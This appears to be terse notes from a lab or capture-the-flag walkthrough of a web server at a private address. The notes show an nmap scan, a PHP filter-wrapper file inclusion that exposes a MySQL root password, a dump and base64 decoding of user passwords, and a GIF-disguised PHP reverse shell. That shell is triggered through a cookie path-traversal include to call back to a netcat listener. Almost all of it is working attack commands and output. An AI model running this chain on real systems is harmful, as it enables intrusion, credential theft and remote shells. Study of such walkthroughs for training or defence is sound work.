nmap -n -p 80 --open 192.168.0.0/24 #scan all hosts in the network without resolve DNS and only port 80.


http://192.168.0.60/?page=php://filter/convert.base64-encode/resource=config #LFI with PHP wrapper / 

    PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+   #Decode as base64  


              <?php

            $server	  = "localhost";

            $username = "root";

            $password = "H4u%QJ_H99";

            $database = "Users";

            ?>
    


kali# mysql -h 192.168.0.60 -u root -p #connect to mysql server

    mysql> show databases; #show databases
    mysql> use Users; #use database
    mysql> show tables; #show tables
    mysql> select * from users; #show all users

        MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.010 sec)

    Decode as base 64 (final ==)

JWzXuBJJNy

login on page with user kent and password JWzXuBJJNy

#webshell 
kali$ cp /usr/share/webshells/php/php-reverse-shell.php . #copy webshell to current directory

kali$ mv php-reverse-shell.php shell.php #rename webshell

kali$ nano shell.php #edit webshell and change ip and port

 
#change magic bytes https://en.wikipedia.org/wiki/List_of_file_signatures

    put GIF89a at the beginning of the shell.php file and save it.

kali$ file shell.php #check magic bytes

    shell.php: GIF image data, version 89a, 1 x 1   //ok

#upload webshell to server     http://



http://192.168.0.60/?page=php://filter/convert.base64-encode/resource=index

convert to base64 (burpsuite)

On include code index, it is possible visualize a cookie with lang name to incorpore files.

f3035846cc279a1aff73b7c2c25367b9.gif  #webshell name


Open another terminal and start a netcat listener on port 1234

curl 192.168.0.60 -H "Cookie: lang=../upload/f3035846cc279a1aff73b7c2c25367b9.gif"
